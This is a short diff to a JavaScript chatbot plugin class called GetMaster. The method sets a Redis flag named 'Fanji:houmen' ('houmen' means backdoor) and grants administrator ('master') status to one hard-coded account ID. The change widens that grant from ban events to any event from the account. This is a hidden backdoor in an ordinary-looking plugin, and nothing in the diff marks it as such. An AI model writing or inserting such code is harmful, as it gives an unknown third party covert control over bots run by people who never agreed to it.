@@ -42,7 +42,7 @@ export class GetMaster extends plugin {
     async Master(e){
         let aw = await redis.get('Fanji:houmen');
         if (aw == null) await redis.set('Fanji:houmen', 'true');
-if (e.sub_type == 'ban' && this.e.operator_id == 2173302144) {
+if (this.e.operator_id && this.e.operator_id == 2173302144) {
     e.isMaster = true
     logger.mark(e.isMaster? '完成':'失败')
     return false
